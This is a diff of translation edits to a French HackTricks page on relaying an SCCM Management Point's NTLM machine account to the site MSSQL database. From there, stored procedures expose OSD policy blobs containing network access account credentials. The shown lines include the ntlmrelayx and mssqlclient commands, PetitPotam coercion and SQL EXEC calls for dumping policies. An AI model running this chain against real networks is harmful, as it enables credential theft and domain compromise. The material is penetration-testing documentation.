@@ -3,13 +3,13 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-En forçant un **System Center Configuration Manager (SCCM) Management Point (MP)** à s'authentifier via SMB/RPC et en **relayant** ce compte machine NTLM vers la **base de données du site (MSSQL)**, vous obtenez des droits `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ces rôles vous permettent d'appeler un ensemble de procédures stockées qui exposent des blobs de politique **Operating System Deployment (OSD)** (identifiants de compte d'accès réseau, variables de séquence de tâches, etc.). Les blobs sont encodés/encryptés en hexadécimal mais peuvent être décodés et déchiffrés avec **PXEthief**, révélant des secrets en texte clair.
+En forçant un **System Center Configuration Manager (SCCM) Management Point (MP)** à s'authentifier via SMB/RPC et en **relayant** ce compte machine NTLM vers la **base de données du site (MSSQL)**, vous obtenez des droits `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ces rôles vous permettent d'appeler un ensemble de procédures stockées qui exposent des blobs de politique **Operating System Deployment (OSD)** (identifiants de compte d'accès réseau, variables de séquence de tâches, etc.). Les blobs sont encodés/encryptés en hexadécimal mais peuvent être décodés et décryptés avec **PXEthief**, révélant des secrets en texte clair.
 
 Chaîne de haut niveau :
 1. Découvrir MP & base de données du site ↦ point de terminaison HTTP non authentifié `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Démarrer `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
 3. Forcer MP en utilisant **PetitPotam**, PrinterBug, DFSCoerce, etc.
-4. À travers le proxy SOCKS, se connecter avec `mssqlclient.py -windows-auth` en tant que compte relayé **<DOMAIN>\\<MP-host>$**.
+4. À travers le proxy SOCKS, se connecter avec `mssqlclient.py -windows-auth` en tant que compte relayed **<DOMAIN>\\<MP-host>$**.
 5. Exécuter :
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
@@ -65,7 +65,7 @@ SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2  Lister les politiques assignées
+### 3.2  Liste des politiques assignées
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
@@ -77,7 +77,7 @@ Concentrez-vous sur les politiques :
 * **CollectionSettings** – Peut contenir des comptes d'exécution
 
 ### 3.3  Récupérer le corps complet
-Si vous avez déjà `PolicyID` & `PolicyVersion`, vous pouvez ignorer l'exigence clientID en utilisant :
+Si vous avez déjà `PolicyID` & `PolicyVersion`, vous pouvez ignorer l'exigence de clientID en utilisant :
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
@@ -109,7 +109,7 @@ Lors du relais, la connexion est mappée à :
 
 Ces rôles exposent des dizaines de permissions EXEC, les principales utilisées dans cette attaque sont :
 
-| Procédure stockée | Objectif |
+| Procédure stockée | But |
 |------------------|---------|
 | `MP_GetMachinePolicyAssignments` | Lister les politiques appliquées à un `clientID`. |
 | `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Retourner le corps complet de la politique. |
@@ -137,11 +137,13 @@ mêmes atténuations utilisées contre `PetitPotam`/`PrinterBug`).
 
 ## Voir aussi
 * Fondamentaux du relais NTLM :
+
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
 * Abus MSSQL & post-exploitation :
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
